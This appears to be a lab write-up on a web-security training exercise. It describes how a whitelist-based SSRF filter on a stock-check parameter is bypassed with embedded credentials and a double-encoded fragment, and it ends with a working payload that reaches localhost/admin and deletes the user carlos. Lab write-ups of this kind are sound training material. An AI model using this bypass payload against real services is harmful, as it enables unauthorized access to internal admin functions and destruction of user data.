Description:
The application includes a stock check feature that fetches data from an internal system.
An anti-SSRF defense is implemented using a whitelist, but it can be bypassed.

Objective:
Access admin panel:
-http://localhost/admin
-Delete user: carlos

Tools Used:
Burp Suite (Proxy, Repeater)

Exploitation Steps:
1️-Intercept Request
-Navigate to a product page
-Click Check Stock
-Intercept the request using Burp Suite

2️-Send to Repeater
-Forward the request to Burp Repeater
-Locate parameter:
stockApi

3️-Analyze Filtering
-Try:
http://127.0.0.1/

Blocked — application validates hostname against whitelist

4️-Test URL Parsing Behavior
-Try:
http://username@stock.weliketoshop.net/

Accepted — indicates support for embedded credentials

5️-Test Fragment Injection
-Try:
http://username#@stock.weliketoshop.net/

Blocked

6️-Bypass with Double Encoding
-Encode # → %23 → %2523
-Try:
http://username%2523@stock.weliketoshop.net/

Server returns error → indicates parsing confusion

7️-Final Exploit
-Craft payload:
-http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos

Result:
-Bypassed whitelist-based SSRF protection
-Forced server to interpret request as localhost
-Accessed admin functionality
-Successfully deleted user carlos
